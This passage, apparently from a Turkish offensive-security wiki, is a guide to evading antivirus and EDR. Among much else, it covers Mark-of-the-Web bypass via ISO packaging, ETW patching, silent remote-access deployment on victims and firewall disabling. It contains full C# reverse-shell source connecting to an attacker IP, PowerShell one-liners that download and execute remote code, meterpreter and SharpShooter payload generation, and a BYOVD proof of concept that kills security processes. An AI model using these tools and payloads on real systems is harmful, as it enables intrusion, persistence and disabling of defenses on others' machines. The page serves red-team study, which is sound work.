2.  Symbol / control-flow recovery – *clean* file'ı **de4dot-cex**'e (ConfuserEx-aware bir de4dot fork'u) verin.
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 profile'ını seçer
• de4dot control-flow flattening'i geri alır, original namespace'leri, class'ları ve variable name'lerini geri yükler ve constant string'lerin şifresini çözer.

3.  Proxy-call stripping – ConfuserEx, decompilation'ı daha da bozmak için direct method call'ları lightweight wrapper'larla (diğer adıyla *proxy call'lar*) değiştirir. Bunları **ProxyCall-Remover** ile kaldırın:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Bu adımdan sonra opak wrapper function'lar (`Class8.smethod_10`, …) yerine `Convert.FromBase64String` veya `AES.Create()` gibi normal .NET API'lerini görmelisiniz.

4.  Manual clean-up – Ortaya çıkan binary'yi dnSpy altında çalıştırın; *real* payload'ı bulmak için büyük Base64 blob'larını veya `RijndaelManaged`/`TripleDESCryptoServiceProvider` kullanımını arayın. Malware çoğu zaman bunu `<Module>.byte_0` içinde initialize edilen, TLV-encoded bir byte array olarak depolar.

Yukarıdaki zincir, malicious sample'ı çalıştırmaya **gerek kalmadan** execution flow'u geri yükler; bu, offline bir workstation üzerinde çalışırken kullanışlıdır.

> 🛈  ConfuserEx, sample'ları otomatik olarak triage etmek için IOC olarak kullanılabilecek `ConfusedByAttribute` adlı özel bir attribute üretir.

#### Tek satırlık
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Bu projenin amacı, [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) ve kurcalamaya karşı koruma yoluyla artırılmış software security sağlayabilen, [LLVM](http://www.llvm.org/) compilation suite'in open-source bir fork'unu sunmaktır.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator, herhangi bir external tool kullanmadan ve compiler'ı değiştirmeden, `C++11/14` language kullanarak compile time'da obfuscated code üretmeyi gösterir.
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework tarafından üretilen obfuscated operations katmanı ekleyerek application'ı crack etmek isteyen kişinin işini biraz daha zorlaştırır.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz, .exe, .dll ve .sys dahil olmak üzere çeşitli PE dosyalarını obfuscate edebilen bir x64 binary obfuscator'dır.
- [**metame**](https://github.com/a0rtega/metame): Metame, arbitrary executables için basit bir metamorphic code engine'dir.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator, ROP (return-oriented programming) kullanan, LLVM-supported languages için fine-grained bir code obfuscation framework'üdür. ROPfuscator, regular instructions'ı ROP chains'e dönüştürerek bir programı assembly code level'da obfuscate eder ve normal control flow'a ilişkin doğal anlayışımızı bozar.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt, Nim ile yazılmış bir .NET PE Crypter'dır.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor, mevcut EXE/DLL dosyalarını shellcode'a dönüştürebilir ve ardından yükleyebilir.

### LLVM compiler-assisted per-function self-masking

Bir implant'ın tamamını yalnızca uykuya geçtiğinde mask'lemek yerine, değiştirilmiş bir LLVM X86 backend'i, seçilen functions inactive oldukları sürece XOR-masked halde tutabilir. Function Peekaboo PoC, demangled names içinde `REG_` içerenleri seçer, final machine code çevresine position-independent entry/exit stubs ekler ve `.text` içinde tek bir shared masking handler üretir; source-level signatures ve Windows x64 calling convention değişmeden kalır.<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend control-flow transformation

Bu işlem instruction selection ve optimization sonrasında gerçekleştirilmelidir; çünkü transformation, **her emitted return** instruction'ını kapsamalı ve tam x86 layout'unu bilmelidir. Emission öncesi bir `MachineFunctionPass`, son `MachineInstr::isReturn()` instruction'ını bulur, final path'in eklenen epilogue'ye fall through etmesi için onu siler ve önceki returns instruction'larını `JMP_1 handler` ile değiştirir. Her return öncesinde compiler tarafından oluşturulan stack/frame teardown korunmalı; yalnızca return instruction'ın kendisi redirect edilmelidir.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` ve `emitFunctionBodyEnd()` per-function stubs'ları üretirken, `emitEndOfAsmFile()` handler'ı üretir. Emission stages arasında paylaşılan symbols, bir prologue branch'in daha sonra gelen epilogue'yi hedeflemesini sağlar; manuel olarak emitted near `je` için `0F 84` yazıp bunu dört-byte MC expression olan `target - address_after_je` takip etmelidir. Handler'a yapılan calls ve jumps bunun yerine `MCInst` objects (`CALL64pcrel32` ve `JMP_1`) olarak emit edilebilir. Bir pass, hiçbir değişiklik yapmadığında seçilmeyen bir function için `false` döndürmelidir; PoC bu path'te hatalı şekilde `true` döndürür.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata and pre-CRT initialization

PoC, `.funcmeta` içinde bir XOR key ve loader-relocated function pointer ile runtime length içeren 16-byte records yerleştirir. C field'ı `uint32_t` olmasına rağmen handler, record offset `+8` konumunda bir QWORD'a erişir; böylece length ve padding'i tüketir ve records'ı `0x10` aralıklarla ilerletir. PE section names yalnızca sekiz byte yer kapladığından runtime lookup `.funcmet` görür. Harici bir patcher executable `.stub` ekler, eski entry-point RVA'yı stub içinde saklar ve `AddressOfEntryPoint` değerini redirect eder; PIC stub, image base'i `gs:[0x60]` → `[PEB+0x10]` üzerinden alır, PE32+ imports içinde dolaşarak zaten import edilmiş bir `VirtualProtect`'i resolve eder ve CRT'den önce çalışır.<sup>[[38]](#references)[[39]](#references)</sup>

Initialization, `gs:[0xE8]` içinde bir sentinel ayarlar ve her metadata function'ını çağırır. Kalıcı olarak readable olan prologue, function start'ını `gs:[0xF0]` içine kaydeder, sentinel'i algılar ve henüz clear durumdaki body'yi atlar. Ardından epilogue `call handler` kullanır; handler 13 register'ı (`0x68` bytes) kaydettikten sonra `[rsp+0x68]` adresindeki return address, transformed function'ın end'i olur ve böylece `end - start` metadata record'a yazılabilir. Tüm bodies mask'lendikten sonra stub sentinel'i temizler ve `ImageBase + original_entry_point_RVA` adresine jump eder.<sup>[[38]](#references)[[39]](#references)</sup>

Normal bir call sırasında prologue, body'yi decode etmek için aynı symmetric handler'ı çağırır. Final path, eklenen epilogue'ye fall through ederken önceki her return doğrudan shared handler'a jump eder. Normal epilogue ayrıca `call` yerine `jmp handler` kullanır; böylece re-masking sonrasında handler'ın `ret` instruction'ı original caller'ın return address'ini tüketir ve function result'ını `RAX` içinde korur.<sup>[[38]](#references)[[39]](#references)</sup>

#### Masking primitive and analysis indicators

Handler mevcut record'ı bulur, fixed visible prologue'yi (bu build'de `0x46` bytes) atlar, kalan bölgenin protection'ını `PAGE_EXECUTE_READWRITE` olarak değiştirir, düşük key byte'ı ile byte-by-byte XOR uygular ve ardından protection'ı `PAGE_EXECUTE_READ` olarak ayarlar. Bu nedenle aynı loop entry sırasında decode, her normal exit sırasında ise encode işlemi yapar.<sup>[[38]](#references)[[39]](#references)</sup>

Bu design için high-signal indicators şunları içerir:<sup>[[38]](#references)[[39]](#references)</sup>

- executable `.stub` içinde bir entry point ve key ile relocated `.text` pointers içeren bir `.funcmet` section'ı;
- pre-CRT PEB, import-table ve section-table parsing işlemlerinin ardından her metadata pointer üzerinden yapılan calls;
- aynı `call`/`pop` PIC prologues ve tek bir handler'a redirect edilmiş çok sayıda return site;
- `gs:[0xE8]`, `gs:[0xF0]` ve `gs:[0xF8]` adreslerine yapılan writes; ardından tekrarlanan `VirtualProtect` transitions ve image-backed executable pages içine bytewise XOR writes.

Bu, cryptographic protection değil, memory-scanner evasion'dır: patched file hâlâ original clear body'yi içerir ve bir debugger `VirtualProtect` veya XOR loop üzerinde break alarak active function'ı dump edebilir. Single-byte XOR, readable metadata ve fixed `0x46` boundary, offline recovery işlemini de kolaylaştırır.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> PoC'nin TEB slots'ları thread-local olmasına karşın modified code pages process-wide'dur. Bu nedenle concurrent veya recursive entry, başka bir invocation çalışırken instructions'ı yeniden toggle edebilir; exceptions ve nonlocal exits de re-masking işlemini atlayabilir. Robust bir implementation transitions'ı synchronize etmeli, `lpflOldProtect` üzerinden gerçekten döndürülen protection'ı restore etmeli, hard-coded stub lengths kullanmamalı, x64 stack alignment için hem `call` hem de `jmp` paths'lerini denetlemeli ve executable bytes yeniden yazıldıktan sonra `FlushInstructionCache` çağırmalıdır. Microsoft, executable code değiştirildiğinde instruction-cache coherency sorumluluğunu açıkça caller'a verir.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

İnternetten bazı executables indirip çalıştırdığınızda bu ekranı görmüş olabilirsiniz.

Microsoft Defender SmartScreen, son kullanıcıyı potansiyel olarak malicious applications çalıştırmaya karşı korumak üzere tasarlanmış bir security mechanism'dir.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen temel olarak reputation-based bir yaklaşım kullanır; yani yaygın olmayan download applications SmartScreen'i tetikleyerek son kullanıcıyı uyarır ve dosyayı çalıştırmasını engeller (ancak dosya More Info -> Run anyway seçeneğine tıklanarak yine de çalıştırılabilir).

**MoTW** (Mark of The Web), internetten indirilen files için, indirildikleri URL ile birlikte otomatik olarak oluşturulan ve Zone.Identifier adını taşıyan bir [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)'dir.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>İnternetten indirilen bir dosyanın Zone.Identifier ADS'sinin kontrol edilmesi.</p></figcaption></figure>

> [!TIP]
> **trusted** bir signing certificate ile imzalanmış executables'ın **SmartScreen'i tetiklemeyeceğini** unutmamak önemlidir.

Payload'larınızın Mark of The Web almasını engellemenin oldukça etkili bir yolu, onları ISO gibi bir tür container içine package etmektir. Bunun nedeni Mark-of-the-Web'in (MOTW) **non NTFS** volumes üzerine uygulanamamasıdır.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) payload'ları Mark-of-the-Web'den kaçınmak için output containers içine package eden bir tool'dur.

Örnek kullanım:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
İşte [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) kullanarak payload'ları ISO dosyalarının içine paketleyip SmartScreen'i bypass etmeye yönelik bir demo.

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW), Windows'ta uygulamaların ve sistem bileşenlerinin **olayları günlüğe kaydetmesine** olanak tanıyan güçlü bir logging mekanizmasıdır. Ancak security product'lar tarafından malicious activity'leri izlemek ve tespit etmek için de kullanılabilir.

AMSI'nin disabled (bypassed) edilmesine benzer şekilde, user space process'in **`EtwEventWrite`** function'ının herhangi bir olay loglamadan hemen return etmesini sağlamak da mümkündür. Bu, function'ın memory'de patch'lenerek hemen return etmesinin sağlanmasıyla yapılır ve böylece ilgili process için ETW logging effectively disabled edilir.

Daha fazla bilgiyi **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) ve [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** adreslerinde bulabilirsiniz.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

C# binary'lerini memory'de load etmek uzun zamandır bilinen bir yöntemdir ve yakalanmadan post-exploitation tools çalıştırmak için hâlâ oldukça iyi bir yöntemdir.

Payload doğrudan memory'ye, diske dokunmadan load edileceğinden, yalnızca tüm process için AMSI'yi patch'lemeye dikkat etmemiz gerekir.

Çoğu C2 framework'ü (sliver, Covenant, metasploit, CobaltStrike, Havoc vb.) C# assembly'lerini doğrudan memory'de execute etme özelliğini zaten sunar, ancak bunu yapmanın farklı yolları vardır:

- **Fork\&Run**

Bu yöntem, **yeni bir sacrificial process spawn etmeyi**, post-exploitation malicious code'unuzu bu yeni process'e inject etmeyi, malicious code'unuzu execute etmeyi ve işlem tamamlandığında yeni process'i kill etmeyi içerir. Bunun hem avantajları hem de dezavantajları vardır. Fork and run yönteminin avantajı, execution'ın **Beacon implant process'imizin dışında** gerçekleşmesidir. Bu, post-exploitation action'larımızdan birinde bir şeyler ters giderse veya action yakalanırsa **implant'ımızın hayatta kalma ihtimalinin çok daha yüksek** olduğu anlamına gelir. Dezavantajı ise **Behavioural Detections** tarafından yakalanma ihtimalinizin daha yüksek olmasıdır.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Bu yöntem, post-exploitation malicious code'un **kendi process'ine** inject edilmesini ifade eder. Bu sayede yeni bir process oluşturup bunun AV tarafından scan edilmesini önleyebilirsiniz; ancak dezavantajı, payload'unuzun execution'ı sırasında bir şeyler ters giderse crash yaşanabileceği için **beacon'ınızı kaybetme** ihtimalinizin **çok daha yüksek** olmasıdır.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly loading hakkında daha fazla bilgi edinmek istiyorsanız [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) adresindeki bu article'a ve InlineExecute-Assembly BOF'a ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) göz atın.

C# Assemblies'leri **PowerShell'den** de load edebilirsiniz; [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) ve [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk) içeriklerine göz atın.

## Diğer Programming Language'leri Kullanma

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) içinde önerildiği üzere, compromised machine'e **Attacker Controlled SMB share üzerinde kurulu interpreter environment'ına** erişim sağlayarak diğer language'leri kullanarak malicious code execute etmek mümkündür.

Interpreter Binaries'lerine ve SMB share üzerindeki environment'a erişim sağlayarak bu language'lerdeki **arbitrary code'u compromised machine'in memory'si içinde execute edebilirsiniz**.

Repo, Defender'ın script'leri hâlâ scan ettiğini; ancak Go, Java, PHP vb. kullanarak **static signature'ları bypass etmek için daha fazla esnekliğe** sahip olduğumuzu belirtiyor. Bu language'lerdeki random, un-obfuscated reverse shell script'leriyle yapılan testler başarılı olmuştur.

## TokenStomping

Token stomping, EDR veya AV gibi bir security product'ın access token'ını manipüle eder. Token'ın privileges'larını azaltmak, process'in çalışmaya devam etmesini sağlarken privileged inspection veya remediation action'larını gerçekleştirmesini engelleyebilir.

Bunu önlemek için Windows, **external process'lerin** security process'lerinin token'ları üzerinde handle almasını **engelleyebilir**.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Trusted Software Kullanma

### Chrome Remote Desktop

[**bu blog post'ta**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) açıklandığı üzere, Chrome Remote Desktop'ı victim'ın PC'sine deploy etmek, ardından bunu kullanarak PC'nin kontrolünü ele geçirmek ve persistence sağlamak kolaydır:<sup>[[35]](#references)</sup>
1. https://remotedesktop.google.com/ adresinden download edin, "Set up via SSH" seçeneğine tıklayın ve ardından Windows için MSI file'a tıklayarak MSI file'ı download edin.
2. Installer'ı victim üzerinde silently çalıştırın (admin gerekir): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop sayfasına geri dönün ve next'e tıklayın. Wizard sizden authorize olmanızı isteyecektir; devam etmek için Authorize button'ına tıklayın.
4. Sağlanan command'ı gerekli adjustments ile execute edin: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (`--pin` parameter'ı GUI kullanmadan PIN'i ayarlar).


## Advanced Evasion

Evasion oldukça karmaşık bir konudur; bazen tek bir system içindeki birçok farklı telemetry kaynağını hesaba katmanız gerekir. Bu nedenle mature environment'larda tamamen undetected kalmak neredeyse imkânsızdır.

Karşılaştığınız her environment'ın kendine özgü güçlü ve zayıf yönleri olacaktır.

Advanced Evasion techniques hakkında temel bilgi edinmek için [@ATTL4S](https://twitter.com/DaniLJ94) tarafından yapılan bu talk'ı izlemenizi şiddetle tavsiye ederim.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Bu ayrıca [@mariuszbit](https://twitter.com/mariuszbit) tarafından Evasion in Depth hakkında yapılan bir başka harika talk'tır.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Eski Techniques**

### **Defender'ın hangi bölümleri malicious olarak bulduğunu kontrol etme**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) kullanarak **binary'nin bölümlerini**, **Defender'ın hangi bölümün malicious olduğunu bulana** kadar **kaldırabilir** ve ilgili bölümü sizin için ayırabilirsiniz.\
Aynı şeyi yapan başka bir tool da [**avred**](https://github.com/dobin/avred)'dir; bu hizmeti [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) adresinde açık web üzerinden sunar.

### **Telnet Server**

Windows10'a kadar tüm Windows sürümleri, şu şekilde (administrator olarak) install edebileceğiniz bir **Telnet server** ile birlikte geliyordu:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Sistem başlatıldığında **başlatılmasını** ve şimdi **çalıştırılmasını** sağlayın:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet portunu değiştir** (stealth) ve firewall'ı devre dışı bırak:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Buradan indirin: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (setup yerine bin downloads dosyalarını istiyorsunuz)

**HOST ÜZERİNDE**: _**winvnc.exe**_ dosyasını çalıştırın ve server'ı yapılandırın:

- _Disable TrayIcon_ seçeneğini etkinleştirin
- _VNC Password_ alanında bir password ayarlayın
- _View-Only Password_ alanında bir password ayarlayın

Ardından binary dosyayı _**winvnc.exe**_ ve **yeni** oluşturulan _**UltraVNC.ini**_ dosyasını **victim** içine taşıyın

#### **Reverse connection**

**attacker**, reverse **VNC connection** yakalamaya **hazır** olması için `vncviewer.exe -listen 5900` binary dosyasını kendi **host**'u **içinde çalıştırmalıdır**. Ardından **victim** içinde: winvnc daemon'unu `winvnc.exe -run` ile başlatın ve `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` komutunu çalıştırın

**UYARI:** Stealth'i korumak için bazı şeyleri yapmamalısınız

- `winvnc` zaten çalışıyorsa yeniden başlatmayın; aksi takdirde bir [popup](https://i.imgur.com/1SROTTl.png) tetiklenir. Çalışıp çalışmadığını `tasklist | findstr winvnc` ile kontrol edin
- `winvnc`'yi aynı dizinde `UltraVNC.ini` olmadan başlatmayın; aksi takdirde [config window](https://i.imgur.com/rfMQWcf.png) açılır
- Yardım için `winvnc -h` çalıştırmayın; aksi takdirde bir [popup](https://i.imgur.com/oc18wcu.png) tetiklenir

### GreatSCT

Buradan indirin: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT içinde:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Şimdi **listener'ı başlatın**: `msfconsole -r file.rc` ve **xml payload**'ı şu komutla **çalıştırın**:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Mevcut defender işlemi çok hızlı sonlandıracaktır.**

### Kendi reverse shell'imizi derleme

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### İlk C# Revershell

Şununla derleyin:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Şununla kullanın:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# compiler kullanarak
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Otomatik indirme ve çalıştırma:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscator listesi: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### injector oluşturmak için python kullanımı örneği:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Diğer araçlar
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Daha Fazla

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Kendi Güvenlik Açığı Bulunan Driver'ını Getir (BYOVD) – AV/EDR'yi Kernel Space'ten Sonlandırma

Storm-2603, ransomware bırakmadan önce endpoint korumalarını devre dışı bırakmak için **Antivirus Terminator** adıyla bilinen küçük bir console utility kullandı. Araç, **kendi güvenlik açığı bulunan ancak *signed* driver'ını** getirir ve bunu, Protected-Process-Light (PPL) AV servislerinin bile engelleyemeyeceği ayrıcalıklı kernel işlemleri gerçekleştirmek için kötüye kullanır.<sup>[[12]](#references)</sup>

Temel çıkarımlar
1. **Signed driver**: Diske gönderilen dosya `ServiceMouse.sys` olsa da binary, Antiy Labs’ın “System In-Depth Analysis Toolkit” paketindeki meşru olarak signed driver `AToolsKrnl64.sys` dosyasıdır. Driver geçerli bir Microsoft signature taşıdığı için Driver-Signature-Enforcement (DSE) etkin olsa bile yüklenir.
2. **Service kurulumu**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
İlk satır driver'ı bir **kernel service** olarak kaydeder, ikinci satır ise driver'ı başlatır; böylece `\\.\ServiceMouse` user land'den erişilebilir hale gelir.
3. **Driver tarafından sunulan IOCTL'ler**
| IOCTL code | Yetenek                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PID aracılığıyla rastgele bir process'i sonlandırma (Defender/EDR servislerini öldürmek için kullanılır) |
| `0x990000D0` | Diskteki rastgele bir dosyayı silme |
| `0x990001D0` | Driver'ı unload etme ve service'i kaldırma |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Neden çalışır**:  BYOVD user-mode korumalarını tamamen atlar; kernel'de çalışan code, PPL/PP, ELAM veya diğer hardening özelliklerinden bağımsız olarak *protected* process'leri açabilir, sonlandırabilir veya kernel object'leri değiştirebilir.

Detection / Mitigation
•  Microsoft’un vulnerable-driver block list'ini (`HVCI`, `Smart App Control`) etkinleştirin; böylece Windows `AToolsKrnl64.sys` dosyasını yüklemeyi reddeder.
